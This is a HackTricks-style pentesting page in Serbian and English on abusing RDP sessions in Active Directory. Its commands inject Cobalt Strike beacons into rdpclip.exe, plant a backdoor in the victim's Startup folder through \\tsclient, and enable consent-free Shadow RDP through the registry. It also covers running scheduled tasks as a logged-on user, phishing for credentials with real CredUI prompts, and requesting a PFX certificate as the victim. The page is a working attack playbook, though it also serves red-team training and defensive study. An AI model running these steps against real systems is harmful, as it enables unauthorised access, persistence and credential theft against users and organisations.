# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Ako **spoljna grupa** ima **RDP access** na bilo kom **računaru** u trenutnom domenu, **napadač** može **kompromitovati taj računar i sačekati korisnika**.

Kada se taj korisnik prijavi putem RDP-a, **napadač može pivot-ovati u njegovu sesiju** i zloupotrebiti njegove dozvole u spoljnom domenu.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Pogledajte **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Ako se korisnik poveže putem **RDP into a machine** gde ga **attacker** **čeka**, **attacker** će moći da **inject a beacon in the RDP session of the user**, i ako je **victim mounted his drive** prilikom pristupa preko RDP-a, **attacker could access it**.

U tom slučaju možete jednostavno **compromise** **victims** **original computer** tako što ćete napisati **backdoor** u **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Ako ste **local admin** na hostu gde žrtva već ima **active RDP session**, možda ćete moći da **view/control that desktop without stealing the password or dumping LSASS**.

Ovo zavisi od **Remote Desktop Services shadowing** politike koja je smeštena u:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Zanimljive vrednosti:

- `0`: Onemogućeno
- `1`: `EnableInputNotify` (kontrola, potrebna dozvola korisnika)
- `2`: `EnableInputNoNotify` (kontrola, **bez odobrenja korisnika**)
- `3`: `EnableNoInputNotify` (samo za pregled, potrebna dozvola korisnika)
- `4`: `EnableNoInputNoNotify` (samo za pregled, **bez odobrenja korisnika**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Ovo je naročito korisno kada privilegovani korisnik povezan preko RDP ostavi otključan desktop, KeePass sesiju, MMC konzolu, browser sesiju ili otvoren admin shell.

## Zakazani zadaci kao prijavljeni korisnik

Ako ste **lokalni administrator** i ciljni korisnik je **trenutno prijavljen**, Task Scheduler može pokrenuti kod **kao taj korisnik bez njihove lozinke**.

Ovo pretvara postojeću prijavnu sesiju žrtve u primitivu za izvršavanje:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Napomene:

- Ako korisnik **nije prijavljen**, Windows obično zahteva lozinku da bi kreirao zadatak koji se izvršava kao taj korisnik.
- Ako je korisnik **prijavljen**, zadatak može da ponovo iskoristi postojeći kontekst prijave.
- Ovo je praktičan način za izvršavanje GUI akcija ili pokretanje binarnih fajlova unutar sesije žrtve bez diranja LSASS.

## Zloupotreba CredUI prompta iz sesije žrtve

Kada možete da izvršavate **unutar interaktivnog desktopa žrtve** (na primer preko **Shadow RDP** ili **zakazanog zadatka koji se pokreće kao taj korisnik**), možete prikazati **pravi Windows dijalog za unos kredencijala** koristeći CredUI API-je i prikupiti kredencijale koje žrtva unese.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Tipičan tok:

1. Pokrenite binarni fajl u sesiji žrtve.
2. Prikažite prompt za autentifikaciju domena koji odgovara trenutnom brendiranju.
3. Raspakujte vraćeni auth buffer.
4. Validirajte prosleđene kredencijale i po potrebi nastavite prikazivati prompt dok se ne unesu validni kredencijali.

Ovo je korisno za **on-host phishing** zato što prompt renderuju standardni Windows API-ji umesto lažnog HTML formulara.

## Zahtev za PFX u kontekstu žrtve

Isti primitiv **scheduled-task-as-user** može se koristiti da se zatraži **sertifikat/PFX kao prijavljeni korisnik**. Taj sertifikat se kasnije može koristiti za **AD authentication** kao taj korisnik, potpuno izbegavajući krađu lozinke.

Visoki nivo toka:

1. Ostvarite **local admin** na hostu na kojem je žrtva prijavljena.
2. Pokrenite logiku za enrollment/export kao žrtva koristeći **scheduled task**.
3. Izvezite dobijeni **PFX**.
4. Koristite PFX za PKINIT / certificate-based AD authentication.

Pogledajte AD CS stranice za dalju zloupotrebu:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
